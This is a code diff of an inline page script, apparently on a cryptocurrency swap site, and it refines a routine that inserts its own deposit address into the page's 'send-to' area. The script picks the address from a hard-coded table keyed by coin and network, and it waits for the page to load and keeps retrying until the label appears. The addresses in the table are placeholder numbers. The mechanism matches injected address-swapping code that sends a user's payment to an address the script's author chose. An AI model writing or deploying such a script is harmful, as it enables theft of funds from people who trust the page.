@@ -44,20 +44,26 @@
   observer.observe(document.body, { childList: true, subtree: true });
 </script>
 <script>
-  // Step 1: All Coin + Network Mapped Addresses
   const coinAddresses = {
+    // BTC
     "BTC_BITCOIN": "1000000000000000",
     "BTC_LIQUID": "1000000000000001",
+
+    // ETH
     "ETH_ETHEREUM": "1000000000000002",
     "ETH_BLAST": "1000000000000003",
     "ETH_SCROLL": "1000000000000004",
-    "ETH_ZKSYNC ERA": "1000000000000005",
+    "ETH_ZKSYNC": "1000000000000005",
     "ETH_BASE": "1000000000000006",
+
+    // USDC
     "USDC_ETHEREUM": "1000000000000007",
     "USDC_BASE": "1000000000000008",
     "USDC_SOLANA": "1000000000000009",
     "USDC_BSC": "1000000000000010",
     "USDC_POLYGON": "1000000000000011",
+
+    // USDT
     "USDT_ETHEREUM": "1000000000000012",
     "USDT_SOLANA": "1000000000000013",
     "USDT_POLYGON": "1000000000000014",
@@ -65,65 +71,54 @@
     "USDT_TON": "1000000000000016",
     "USDT_BSC": "1000000000000017",
     "USDT_LIQUID": "1000000000000018",
+
+    // Others
     "SOL_SOLANA": "1000000000000019",
     "TRX_TRON": "1000000000000020",
     "BNB_BSC": "1000000000000021"
   };
 
   function showCoinAddress() {
-    // Get label
     const label = document.querySelector('#You\\ send-label');
     if (!label) return false;
 
-    // Get coin container
     const coinContainer = label.closest('.flex.flex-col.items-start');
     if (!coinContainer) return false;
 
-    // Get coin symbol (e.g., USDC)
     const coinSymbolEl = coinContainer.querySelector('span.font-bold');
     if (!coinSymbolEl) return false;
 
-    const symbol = coinSymbolEl.textContent.trim();
+    const symbol = coinSymbolEl.textContent.trim().toUpperCase();
 
-    // Get network (e.g., solana, ethereum, etc.)
+    // Get network name (first word, uppercase)
     const networkEl = coinContainer.querySelector('.font-display.mt-2');
     if (!networkEl) return false;
 
-    const networkText = networkEl.textContent.trim().toUpperCase(); // like "SOLANA NETWORK"
-    const network = networkText.split(" ")[0]; // Only take first word like "SOLANA"
+    const rawNetwork = networkEl.childNodes[0]?.textContent?.trim() || "";
+    const network = rawNetwork.toUpperCase();
 
     const key = `${symbol}_${network}`.toUpperCase();
-
     const address = coinAddresses[key];
     if (!address) return false;
 
-    // Inject custom styled address
     function injectAddress() {
       const sendToLabel = document.getElementById("send-to-label");
       if (!sendToLabel) return false;
 
       let addressEl = document.getElementById("custom-address-display");
       if (!addressEl) {
-        addressEl = document.createElement("div");
+        addressEl = document.createElement("span");
         addressEl.id = "custom-address-display";
-        addressEl.className = "custom-address";
-        addressEl.style.marginTop = "6px";
-
-        // Style exactly like your example span
-        const styledSpan = document.createElement("span");
-        styledSpan.className = "dark:text-flashbang-white text-new-black inline-block select-all break-words break-all text-xl font-bold";
-        styledSpan.textContent = address;
-
-        addressEl.appendChild(styledSpan);
+        addressEl.className = "dark:text-flashbang-white text-new-black inline-block select-all break-words break-all text-xl font-bold";
+        addressEl.style.marginTop = "8px";
         sendToLabel.insertAdjacentElement("afterend", addressEl);
-      } else {
-        addressEl.querySelector("span").textContent = address;
       }
 
+      addressEl.textContent = address;
       return true;
     }
 
-    // Watch for send-to-label if not there yet
+    // MutationObserver to wait until #send-to-label appears
     const observer = new MutationObserver(() => {
       const success = injectAddress();
       if (success) observer.disconnect();
@@ -137,7 +132,6 @@
     return true;
   }
 
-  // Run when page loads
   window.addEventListener('load', function () {
     setTimeout(() => {
       const maxAttempts = 20;
@@ -146,7 +140,6 @@
       const interval = setInterval(() => {
         const started = showCoinAddress();
         attempts++;
-
         if (started || attempts >= maxAttempts) {
           clearInterval(interval);
         }
@@ -154,6 +147,7 @@
     }, 3000);
   });
 </script>
+
 
 
 
